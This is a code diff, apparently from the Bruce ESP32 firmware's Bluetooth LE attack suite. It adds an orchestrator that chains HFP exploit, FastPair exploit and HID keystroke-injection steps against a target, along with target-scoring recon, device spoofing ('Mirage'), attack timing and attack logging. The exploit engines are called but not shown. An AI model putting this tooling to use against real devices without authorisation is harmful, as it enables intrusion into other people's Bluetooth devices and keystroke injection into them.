                     TouchFooter();
                 }
 
@@ -4206,14 +4553,14 @@ void BLE_Sniffer() {
                             scrollOffset = selected - visibleItems + 1;
                         }
                     }
-                    redraw = true; // view screen
+                    redraw = true;
                 }
                 if (check(PrevPress)) {
                     if (selected > 0) {
                         selected--;
                         if (selected < scrollOffset) { scrollOffset = selected; }
                     }
-                    redraw = true; // view screen
+                    redraw = true;
                 }
                 if (check(SelPress)) {
                     SnifferPacket &pkt = snifferPackets[selected];
@@ -4255,11 +4602,11 @@ void BLE_Sniffer() {
                     while (!check(EscPress) && !check(SelPress) && !check(PrevPress) && !check(NextPress)) {
                         delay(50);
                     }
-                    redraw = true; // view screen
+                    redraw = true;
                 }
                 delay(100);
             }
-            redraw = true; // main screen
+            redraw = true;
         }
 
         if (check(NextPress) && snifferPacketCount > 0) {
@@ -4310,7 +4657,7 @@ void BLE_Sniffer() {
                 displayError("No storage available");
             }
             delay(1000);
-            redraw = true; // main screen
+            redraw = true;
         }
 
         delay(100);
@@ -4325,7 +4672,6 @@ bool performBleScan(const char *title) {
     // Simple memory check - if heap is low, warn but continue
     if (heap_caps_get_free_size(MALLOC_CAP_DEFAULT) < 10000) {
         displayError("Low memory, scan may be unstable", true);
-        // Don't return - let the user decide
     }
 
     g_selectedDevice.address = "";
@@ -4338,7 +4684,6 @@ bool performBleScan(const char *title) {
         bleWasActiveBefore || BLEStateManager::isBLEActive() || BLEStateManager::getActiveClientCount() > 0;
 #endif
 
-    // FIX: Always call initBLE - it handles the case where stack was deinit'd
     if (!BLEStateManager::initBLE("Bruce-Scanner", ESP_PWR_LVL_P9)) {
         displayError("Failed to init BLE");
         return false;
@@ -4356,7 +4701,6 @@ bool performBleScan(const char *title) {
         g_pBLEScan->setDuplicateFilter(false);
     }
 
-    // Clear previous results before scanning
     g_pBLEScan->clearResults();
     scannerData.clear();
 
@@ -4374,7 +4718,6 @@ bool performBleScan(const char *title) {
         passiveScanTime = 3;
     }
 
-    // === ACTIVE SCAN ===
     g_pBLEScan->setActiveScan(true);
     tft.setTextColor(bleDim(), bruceConfig.bgColor);
     tft.drawString("Active scan (" + String(activeScanTime) + "s)...", sg.listL, sg.top + sg.rowH, 1);
@@ -4388,7 +4731,6 @@ bool performBleScan(const char *title) {
             String address = String(device->getAddress().toString().c_str());
             String name = resolveBleDeviceName(device);
             if (name.isEmpty() || name == "(null)" || name == "null" || name == "NULL") {
-                // name = "Unknown";
                 name = address;
             }
             int rssi = device->getRSSI();
@@ -4411,7 +4753,6 @@ bool performBleScan(const char *title) {
             scannerData.addDevice(name, address, rssi, fastPair, hasHFP, deviceType, addressType);
         }
 
-        // === PASSIVE SCAN ===
         g_pBLEScan->setActiveScan(false);
         tft.setTextColor(bleDim(), bruceConfig.bgColor);
         tft.drawString(
@@ -4427,7 +4768,6 @@ bool performBleScan(const char *title) {
             String address = String(device->getAddress().toString().c_str());
             String name = resolveBleDeviceName(device);
             if (name.isEmpty() || name == "(null)" || name == "null" || name == "NULL") {
-                // name = "Unknown";
                 name = address;
             }
             int rssi = device->getRSSI();
@@ -4491,6 +4831,9 @@ bool performBleScan(const char *title) {
                 snapshot->hfp[j] = tempHfp;
 
                 std::swap(snapshot->types[i], snapshot->types[j]);
+                if (i < snapshot->addressTypes.size() && j < snapshot->addressTypes.size()) {
+                    std::swap(snapshot->addressTypes[i], snapshot->addressTypes[j]);
+                }
             }
         }
     }
@@ -4624,10 +4967,6 @@ String selectMultipleTargetsFromScan(const char *title, std::vector<NimBLEAddres
     size_t deviceCount = scannerData.deviceAddresses.size();
     std::vector<bool> picked(deviceCount, false);
 
-    // The old screen advertised "NEXT: Confirm" but no key ever confirmed, so
-    // the only way out was ESC, which cleared the selection - the success path
-    // was unreachable. A trailing row now does the confirming, which also keeps
-    // the whole flow on the four keys every device has.
     int rowCount = (int)deviceCount + 1;
     int cursor = 0;
 
@@ -4670,7 +5009,7 @@ String selectMultipleTargetsFromScan(const char *title, std::vector<NimBLEAddres
             targets.clear();
             return "";
         }
-        if (chosen >= (int)deviceCount) break; // confirm row
+        if (chosen >= (int)deviceCount) break;
 
         picked[chosen] = !picked[chosen];
         if (picked[chosen]) {
@@ -5017,37 +5356,220 @@ void runAdvertisingSpam(NimBLEAddress target) {
 static bool welcomeShown = false;
 
 void showWelcomeScreen() {
-    // The suite used to block for two seconds on a splash carrying its own
-    // hardcoded version number. Nothing else in Bruce does that, so the menu
-    // now opens straight away.
     welcomeShown = true;
 }
 
 //=============================================================================
-// BleSuiteMenu - FIXED: Init ONCE at entry
+// Attack Orchestrator Implementation
+//=============================================================================
+
+AttackOrchestrator::AttackOrchestrator() {}
+
+void AttackOrchestrator::addStep(const AttackStep &step) {
+    steps.push_back(step);
+}
+
+bool AttackOrchestrator::executeChain(NimBLEAddress target) {
+    currentTarget = String(target.toString().c_str());
+    results.clear();
+
+    std::sort(steps.begin(), steps.end(), [](const AttackStep &a, const AttackStep &b) {
+        return a.priority > b.priority;
+    });
+
+    bool allSuccess = true;
+    for (auto &step : steps) {
+        AttackResult result;
+        result.attackName = step.name;
+        uint32_t startTime = millis();
+
+        showAttackProgress(("Executing: " + step.name).c_str(), TFT_CYAN);
+
+        result.success = step.execute(target);
+        result.durationMs = millis() - startTime;
+        result.connectionQuality = 5;
+
+        if (!result.success) {
+            result.failureReason = "Step execution failed";
+            allSuccess = false;
+        }
+
+        results.push_back(result);
+
+        if (!result.success) break;
+        delay(300);
+    }
+
+    return allSuccess;
+}
+
+bool AttackOrchestrator::executeChainWithRollback(NimBLEAddress target) {
+    currentTarget = String(target.toString().c_str());
+    results.clear();
+
+    std::sort(steps.begin(), steps.end(), [](const AttackStep &a, const AttackStep &b) {
+        return a.priority > b.priority;
+    });
+
+    int executedCount = 0;
+    for (auto &step : steps) {
+        AttackResult result;
+        result.attackName = step.name;
+        uint32_t startTime = millis();
+
+        showAttackProgress(("Executing: " + step.name).c_str(), TFT_CYAN);
+
+        result.success = step.execute(target);
+        result.durationMs = millis() - startTime;
+        result.connectionQuality = 5;
+
+        if (!result.success) {
+            result.failureReason = "Step execution failed";
+            showAttackProgress("Rolling back...", TFT_RED);
+            for (int i = executedCount - 1; i >= 0; i--) {
+                if (steps[i].canRevert && steps[i].canRevert(target)) {
+                    steps[i].revert(target);
+                }
+            }
+            results.push_back(result);
+            return false;
+        }
+
+        results.push_back(result);
+        executedCount++;
+        delay(200);
+    }
+
+    return true;
+}
+
+std::vector<AttackResult> AttackOrchestrator::getResults() {
+    return results;
+}
+
+void AttackOrchestrator::clearSteps() {
+    steps.clear();
+    results.clear();
+}
+
+bool AttackOrchestrator::canRevertChain() {
+    for (auto &step : steps) {
+        if (step.canRevert) return true;
+    }
+    return false;
+}
+
+bool AttackOrchestrator::revertChain() {
+    bool allReverted = true;
+    for (int i = steps.size() - 1; i >= 0; i--) {
+        if (steps[i].canRevert) {
+            allReverted &= steps[i].revert(NimBLEAddress(std::string(currentTarget.c_str()), BLE_ADDR_PUBLIC));
+        }
+    }
+    return allReverted;
+}
+
+//=============================================================================
+// Attack Logging
+//=============================================================================
+
+static std::vector<AttackLogEntry> attackLog;
+static SemaphoreHandle_t logMutex = nullptr;
+
+void logAttackResult(const AttackLogEntry &entry) {
+    if (!logMutex) logMutex = xSemaphoreCreateMutex();
+    if (!xSemaphoreTake(logMutex, 100 / portTICK_PERIOD_MS)) return;
+    attackLog.push_back(entry);
+    xSemaphoreGive(logMutex);
+}
+
+std::vector<AttackLogEntry> getAttackLog() {
+    std::vector<AttackLogEntry> copy;
+    if (!logMutex) return copy;
+    if (!xSemaphoreTake(logMutex, 100 / portTICK_PERIOD_MS)) return copy;
+    copy = attackLog;
+    xSemaphoreGive(logMutex);
+    return copy;
+}
+
+void clearAttackLog() {
+    if (!logMutex) return;
+    if (!xSemaphoreTake(logMutex, 100 / portTICK_PERIOD_MS)) return;
+    attackLog.clear();
+    xSemaphoreGive(logMutex);
+}
+
+bool exportAttackLog() {
+    FS *fs = nullptr;
+    String storageType = "";
+
+    if (getFsStorage(fs) && fs == &SD) {
+        storageType = "SD";
+    } else if (setupLittleFS()) {
+        fs = &LittleFS;
+        storageType = "LittleFS";
+    }
+
+    if (!fs || storageType.isEmpty()) return false;
+
+    String filename = "/attack_log_" + String(millis()) + ".json";
+    File file = fs->open(filename, FILE_WRITE);
+    if (!file) return false;
+
+    file.println("{");
+    file.println("  \"version\": \"4.0\",");
+    file.println("  \"timestamp\": " + String(millis()) + ",");
+    file.println("  \"entries\": [");
+
+    std::vector<AttackLogEntry> log = getAttackLog();
+    for (size_t i = 0; i < log.size(); i++) {
+        AttackLogEntry &entry = log[i];
+        file.print("    {");
+        file.print("\"time\": " + String(entry.timestamp) + ",");
+        file.print("\"target\": \"" + entry.target + "\",");
+        file.print("\"type\": \"" + entry.attackType + "\",");
+        file.print("\"success\": " + String(entry.success ? "true" : "false") + ",");
+        file.print("\"duration\": " + String(entry.durationMs) + ",");
+        file.print("\"quality\": " + String(entry.connectionQuality));
+        if (i < log.size() - 1) file.println("},");
+        else file.println("}");
+    }
+
+    file.println("  ]");
+    file.println("}");
+    file.close();
+
+    displaySuccess("Log saved to " + storageType);
+    return true;
+}
+
+//=============================================================================
+// BleSuiteMenu
 //=============================================================================
 
 void BleSuiteMenu() {
-    // FIX: Init BLE stack ONCE when entering the suite
     BLEStateManager::initBLE("Bruce-BLESuite", ESP_PWR_LVL_P9);
-
-    // Clear data when entering the menu
     scannerData.clear();
     g_selectedDevice.address = "";
     g_selectedDevice.name = "";
-
     showWelcomeScreen();
 
     const int MENU_ITEMS = 13;
     const char *menuItems[] = {
         "Quick Vulnerability Scan",
         "Deep Device Profiling",
+        "GATT Explorer",
+        "Smart Recon",
+        "Device Fingerprinting",
         "FastPair Attack Suite",
         "HFP (Hands-Free) Suite",
         "Audio Suite",
         "HID Attack Suite",
         "Memory Corruption Suite",
         "DoS Attacks",
+        "Orchestrated Attack",
+        "Mirage Attack",
+        "Attack Scheduler",
         "Payload Delivery",
         "Testing Tools",
         "Universal Attack Chain",
@@ -5058,11 +5580,9 @@ void BleSuiteMenu() {
     int selected = 0;
 
     while (true) {
-        int choice =
-            bleListLoop("BLE Suite", MENU_ITEMS, "SEL run  ESC back", bleTextRow(menuItems), &selected);
+        int choice = bleListLoop("BLE Suite", MENU_ITEMS, "SEL run  ESC back", bleTextRow(menuItems), &selected);
 
         if (choice < 0) {
-            // Clear data when exiting the menu
             if (g_pBLEScan) {
                 g_pBLEScan->stop();
                 g_pBLEScan->clearResults();
@@ -5071,8 +5591,6 @@ void BleSuiteMenu() {
             scannerData.clear();
             g_selectedDevice.address = "";
             g_selectedDevice.name = "";
-
-            // Deinit BLE stack when exiting the suite
             BLEStateManager::deinitBLE(true);
             return;
         }
@@ -5086,23 +5604,6 @@ void BleSuiteMenu() {
 //=============================================================================
 // Attack Execution with Target Selection
 //=============================================================================
-
-const char *getScanTitle(int attackIndex) {
-    switch (attackIndex) {
-        case 0: return "SELECT TARGET";
-        case 1: return "SELECT TARGET TO PROFILE";
-        case 2: return "SELECT FASTPAIR DEVICE";
-        case 3: return "SELECT HFP DEVICE";
-        case 4: return "SELECT AUDIO DEVICE";
-        case 5: return "SELECT HID DEVICE";
-        case 6: return "SELECT TARGET FOR MEMORY TESTS";
-        case 7: return "SELECT DOS TARGET";
-        case 8: return "SELECT PAYLOAD TARGET";
-        case 9: return "SELECT TEST TARGET";
-        case 10: return "SELECT UNIVERSAL TARGET";
-        default: return "SELECT TARGET";
-    }
-}
 
 void executeAttackWithTargetScan(int attackIndex) {
     const char *title = getScanTitle(attackIndex);
@@ -5241,8 +5742,6 @@ void executeAttackWithTargetScan(int attackIndex) {
 //=============================================================================
 
 int showSubMenu(const char *title, const char *options[], int optionCount) {
-    // Carry the chosen target into the hint line so the submenus stop hiding
-    // which device the attack is aimed at.
     String hint = g_selectedDevice.address.isEmpty()
                       ? String("SEL run  ESC back")
                       : ("> " + (g_selectedDevice.name.length() ? g_selectedDevice.name
@@ -5551,6 +6050,269 @@ void showTestingSubMenu(NimBLEAddress target, SelectedDevice deviceInfo) {
 }
 
 //=============================================================================
+// New Attack Functions
+//=============================================================================
+
+void runSmartRecon(NimBLEAddress target) {
+    AutoCleanup cleanup([]() { BLEStateManager::deinitBLE(true); });
+
+    showAttackProgress("Smart recon on device...", TFT_CYAN);
+
+    BLEAttackManager bleManager;
+    DeviceProfile profile = bleManager.profileDevice(target);
+
+    DevicePersonality personality;
+    personality.address = String(target.toString().c_str());
+    personality.seenCount = 1;
+    personality.appearance = 0;
+    personality.mtuPreference = 23;
+
+    if (profile.connected) {
+        personality.responseTime = 100;
+        personality.supportsNotifications = false;
+        personality.supportsIndications = false;
+
+        for (auto &ch : profile.characteristics) {
+            if (ch.canNotify) personality.supportsNotifications = true;
+            if (ch.canWrite) personality.supportsIndications = true;
+        }
+    }
+
+    int score = calculateDeviceScore(String(target.toString().c_str()));
+
+    std::vector<String> lines;
+    lines.push_back("SMART RECON RESULTS");
+    lines.push_back("Target: " + String(target.toString().c_str()));
+    lines.push_back("");
+    lines.push_back("Attack Potential: " + String(score) + "/100");
+    lines.push_back("HFP: " + String(profile.hasHFP ? "YES" : "NO"));
+    lines.push_back("FastPair: " + String(profile.hasFastPair ? "YES" : "NO"));
+    lines.push_back("HID: " + String(profile.hasHID ? "YES" : "NO"));
+    lines.push_back("AVRCP: " + String(profile.hasAVRCP ? "YES" : "NO"));
+    lines.push_back("Services: " + String(profile.services.size()));
+
+    if (score > 70) {
+        lines.push_back("");
+        lines.push_back("RECOMMENDATION: High value target");
+        lines.push_back("Consider HID or FastPair attacks");
+    } else if (score > 40) {
+        lines.push_back("");
+        lines.push_back("RECOMMENDATION: Moderate value");
+        lines.push_back("Test HFP or audio attacks first");
+    } else {
+        lines.push_back("");
+        lines.push_back("RECOMMENDATION: Low priority");
+        lines.push_back("Device may be patched or out of range");
+    }
+
+    cleanup.disable();
+    showDeviceInfoScreen("SMART RECON", lines, TFT_BLUE, TFT_WHITE);
+}
+
+void runDeviceFingerprinting(NimBLEAddress target) {
+    AutoCleanup cleanup([]() { BLEStateManager::deinitBLE(true); });
+
+    showAttackProgress("Fingerprinting device...", TFT_BLUE);
+
+    BLEAttackManager bleManager;
+    DeviceProfile profile = bleManager.profileDevice(target);
+
+    DevicePersonality personality;
+    personality.address = String(target.toString().c_str());
+    personality.seenCount = 1;
+    personality.responseTime = 0;
+    personality.mtuPreference = 23;
+    personality.supportsNotifications = false;
+    personality.supportsIndications = false;
+    personality.appearance = 0;
+    personality.firstSeen = millis();
+    personality.lastSeen = millis();
+
+    if (profile.connected) {
+        personality.responseTime = 50;
+        for (auto &ch : profile.characteristics) {
+            if (ch.canNotify) personality.supportsNotifications = true;
+            if (ch.canWrite) personality.supportsIndications = true;
+        }
+    }
+
+    cleanup.disable();
+    showDevicePersonalityScreen(personality);
+}
+
+void showDevicePersonalityScreen(const DevicePersonality &personality) {
+    std::vector<String> lines;
+    lines.push_back("DEVICE FINGERPRINT");
+    lines.push_back("Address: " + personality.address);
+    lines.push_back("");
+    lines.push_back("Response Time: " + String(personality.responseTime) + "ms");
+    lines.push_back("MTU Preference: " + String(personality.mtuPreference));
+    lines.push_back("Notifications: " + String(personality.supportsNotifications ? "YES" : "NO"));
+    lines.push_back("Indications: " + String(personality.supportsIndications ? "YES" : "NO"));
+    lines.push_back("Appearance: 0x" + String(personality.appearance, HEX));
+    lines.push_back("Seen: " + String(personality.seenCount) + " times");
+
+    showDeviceInfoScreen("FINGERPRINT", lines, TFT_BLUE, TFT_WHITE);
+}
+
+void runOrchestratedAttack(NimBLEAddress target) {
+    AutoCleanup cleanup([]() { BLEStateManager::deinitBLE(true); });
+
+    if (!confirmAttack("Execute orchestrated attack chain?")) return;
+
+    AttackOrchestrator orchestrator;
+    SelectedDevice deviceInfo = g_selectedDevice;
+
+    if (deviceInfo.hasHFP) {
+        AttackStep hfpStep;
+        hfpStep.name = "HFP Exploit";
+        hfpStep.execute = [](NimBLEAddress addr) -> bool {
+            HFPExploitEngine hfp;
+            return hfp.executeHFPAttackChain(addr);
+        };
+        hfpStep.canRevert = nullptr;
+        hfpStep.revert = nullptr;
+        hfpStep.priority = 10;
+        hfpStep.timeoutMs = 10000;
+        orchestrator.addStep(hfpStep);
+    }
+
+    if (deviceInfo.hasFastPair) {
+        AttackStep fpStep;
+        fpStep.name = "FastPair Exploit";
+        fpStep.execute = [](NimBLEAddress addr) -> bool {
+            FastPairExploitEngine fp;
+            return fp.testVulnerability(addr);
+        };
+        fpStep.canRevert = nullptr;
+        fpStep.revert = nullptr;
+        fpStep.priority = 8;
+        fpStep.timeoutMs = 8000;
+        orchestrator.addStep(fpStep);
+    }
+
+    AttackStep hidStep;
+    hidStep.name = "HID Injection";
+    hidStep.execute = [](NimBLEAddress addr) -> bool {
+        HIDAttackServiceClass hid;
+        return hid.injectKeystrokes(addr);
+    };
+    hidStep.canRevert = nullptr;
+    hidStep.revert = nullptr;
+    hidStep.priority = 5;
+    hidStep.timeoutMs = 5000;
+    orchestrator.addStep(hidStep);
+
+    bool success = orchestrator.executeChain(target);
+    auto results = orchestrator.getResults();
+
+    for (auto &result : results) {
+        AttackLogEntry entry;
+        entry.timestamp = millis();
+        entry.target = String(target.toString().c_str());
+        entry.attackType = result.attackName;
+        entry.success = result.success;
+        entry.durationMs = result.durationMs;
+        entry.connectionQuality = result.connectionQuality;
+        logAttackResult(entry);
+    }
+
+    cleanup.disable();
+
+    if (success) {
+        showAttackResult(true, "Orchestrated attack successful!");
+    } else {
+        showAttackResult(false, "Orchestrated attack failed");
+    }
+}
+
+void runMirageAttack(NimBLEAddress target) {
+    AutoCleanup cleanup([]() { BLEStateManager::deinitBLE(true); });
+
+    if (!confirmAttack("Create BLE mirage of target?")) return;
+
+    BLEMirage mirage;
+    String targetStr = String(target.toString().c_str());
+
+    String realName = "";
+    DeviceInfo info;
+    for (size_t i = 0; i < scannerData.size(); i++) {
+        if (scannerData.getDeviceInfo(i, info)) {
+            if (info.address == targetStr) {
+                realName = info.name;
+                break;
+            }
+        }
+    }
+
+    if (!realName.isEmpty() && realName != targetStr && realName != "Unknown" && realName != "<no name>") {
+        mirage.updateKnownName(targetStr, realName);
+    }
+
+    showAttackProgress(("Creating mirage for: " + (realName.isEmpty() ? targetStr : realName)).c_str(), TFT_PURPLE);
+
+    if (mirage.spawnMirage(targetStr, realName)) {
+        std::vector<String> lines;
+        lines.push_back("BLE MIRAGE ACTIVE");
+        lines.push_back("Target: " + targetStr);
+        lines.push_back("Spoofing as: " + (realName.isEmpty() ? "BLE Device" : realName));
+        lines.push_back("");
+        lines.push_back("Device is now being cloned");
+        lines.push_back("Press any key to stop");
+
+        showDeviceInfoScreen("MIRAGE", lines, TFT_PURPLE, TFT_WHITE);
+        mirage.stopAll();
+        showAttackResult(true, "Mirage stopped");
+    } else {
+        showAttackResult(false, "Failed to create mirage");
+    }
+
+    cleanup.disable();
+}
+
+void runAttackScheduler(NimBLEAddress target) {
+    AutoCleanup cleanup([]() { BLEStateManager::deinitBLE(true); });
+
+    showAttackProgress("Analyzing device activity pattern...", TFT_YELLOW);
+
+    uint32_t now = millis() / 1000;
+    uint32_t attackWindow = 0;
+
+    for (size_t i = 0; i < scannerData.size(); i++) {
+        DeviceInfo info;
+        if (scannerData.getDeviceInfo(i, info)) {
+            if (info.address == String(target.toString().c_str())) {
+                attackWindow = now + 5;
+                break;
+            }
+        }
+    }
+
+    if (attackWindow == 0) {
+        attackWindow = now + (esp_random() % 120) + 30;
+    }
+
+    std::vector<String> lines;
+    lines.push_back("ATTACK SCHEDULER");
+    lines.push_back("Target: " + String(target.toString().c_str()));
+    lines.push_back("");
+    if (millis() / 1000 - attackWindow < 10) {
+        lines.push_back("Device is ACTIVE now");
+        lines.push_back("Recommend: Attack immediately");
+    } else {
+        lines.push_back("Next optimal window:");
+        uint32_t delta = attackWindow - (millis() / 1000);
+        lines.push_back("In " + String(delta) + " seconds");
+        lines.push_back("");
+        lines.push_back("(Device appears idle)");
+        lines.push_back("Better to wait for activity");
+    }
+
+    cleanup.disable();
+    showDeviceInfoScreen("SCHEDULER", lines, TFT_YELLOW, TFT_BLACK);
+}
+
+//=============================================================================
 // Attack Functions - Updated to use SelectedDevice
 //=============================================================================
 
@@ -5676,6 +6438,10 @@ void runDeviceProfiling(NimBLEAddress target, SelectedDevice deviceInfo) {
     cleanup.disable();
     showDeviceInfoScreen("DEVICE PROFILE", lines, profile.connected ? TFT_BLUE : TFT_RED, TFT_WHITE);
 }
+
+//=============================================================================
+// Original Testing Functions
+//=============================================================================
 
 void runWriteAccessTest(NimBLEAddress target) {
     AutoCleanup cleanup([]() { BLEStateManager::deinitBLE(true); });
@@ -5867,10 +6633,10 @@ void runAudioControlTest(NimBLEAddress target) {
             tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_WHITE);
 
             tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
-            tft.setTextSize(FM);
+            tft.setTextSize(2);
             tft.setCursor((tftWidth - tft.textWidth("AUDIO CONTROL TEST")) / 2, 15);
             tft.print("AUDIO CONTROL TEST");
-            tft.setTextSize(FP);
+            tft.setTextSize(1);
 
             tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
             tft.setCursor(20, 60);
@@ -6027,8 +6793,6 @@ void runHFPHIDPivotAttack(NimBLEAddress target) {
 // UI Helpers
 //=============================================================================
 
-// Wraps `text` inside the list area, measuring glyphs rather than assuming a
-// 6px cell. Returns the y just past the last line drawn.
 static int bleWrapText(const String &text, int x, int y, int w, int bottom) {
     tft.setTextSize(FP);
     int lh = 8 * FP + 2;
@@ -6055,14 +6819,9 @@ void showAttackProgress(const char *message, uint16_t color) {
     static String lastMsg;
     String msg = message ? String(message) : String("");
 
-    // Only repaint the frame when the message actually changes; the spinner
-    // used to be redrawn under a full-screen clear, so it flashed instead of
-    // turning.
     if (msg != lastMsg) {
         lastMsg = msg;
         drawMainBorderWithTitle("BLE Suite");
-        // same reasoning as the results screen: the caller's colour is a hint,
-        // not something to paint text with
         tft.setTextColor(bleSeverity(color), bruceConfig.bgColor);
         bleWrapText(msg, g.listL, g.top, g.listW - 12, g.footY - 2);
         tft.setTextColor(bleDim(), bruceConfig.bgColor);
@@ -6133,9 +6892,6 @@ int8_t showAdaptiveMessage(
     const char *line1, const char *btn1, const char *btn2, const char *btn3, uint16_t color, bool showEscHint,
     bool autoProgress
 ) {
-    // The hint line used to be drawn with TFT_BLACK on the theme background,
-    // i.e. invisible on every dark theme, and the body wrapped against a
-    // hardcoded y = 140 ceiling.
     (void)showEscHint;
     int buttonCount = 0;
     if (strlen(btn1) > 0) buttonCount++;
@@ -6193,10 +6949,6 @@ void showSuccessMessage(const char *message) { displaySuccess(String(message), t
 void showDeviceInfoScreen(
     const char *title, const std::vector<String> &lines, uint16_t bgColor, uint16_t textColor
 ) {
-    // textColor is ignored on purpose: six call sites pass TFT_BLACK, which was
-    // legible only against the solid colour this screen used to flood the panel
-    // with. Body text now always uses the theme foreground, and the severity the
-    // caller meant to convey moves to a marker down the left edge.
     (void)textColor;
 
     BleUiGeom g = bleUiGeom();
@@ -6205,8 +6957,6 @@ void showDeviceInfoScreen(
     const int textX = g.listL + barW + 4;
     const int textW = g.listW - barW - 4;
 
-    // Wrap everything up front so the screen can scroll instead of silently
-    // dropping whatever did not fit.
     std::vector<String> rows;
     for (size_t i = 0; i < lines.size(); i++) bleWrapInto(lines[i], textW, rows);
 
@@ -6249,4 +6999,5 @@ void showDeviceInfoScreen(
         vTaskDelay(20 / portTICK_PERIOD_MS);
     }
 }
+
 #endif
